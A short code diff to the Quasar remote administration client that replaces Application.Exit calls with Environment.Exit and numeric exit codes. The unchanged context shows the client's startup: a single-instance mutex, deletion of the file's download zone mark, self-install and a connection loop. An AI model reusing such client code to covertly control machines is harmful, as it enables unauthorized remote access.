@@ -104,13 +104,13 @@ namespace Quasar.Client
         {
             // decrypt and verify the settings
             if (!Settings.Initialize())
-                Application.Exit();
+                Environment.Exit(1);
 
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
             // check if process with same mutex is already running on system
             if (!ApplicationMutex.CreatedNew)
-                Application.Exit();
+                Environment.Exit(2);
 
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
@@ -124,7 +124,7 @@ namespace Quasar.Client
                 try
                 {
                     installer.Install();
-                    Application.Exit();
+                    Environment.Exit(3);
                 }
                 catch (Exception e)
                 {
@@ -165,7 +165,7 @@ namespace Quasar.Client
                     // Start connection loop on new thread and dispose application once client exits.
                     // This is required to keep the UI thread responsive and run the message loop.
                     _connectClient.ConnectLoop();
-                    Application.Exit();
+                    Environment.Exit(0);
                 }).Start();
             }
         }
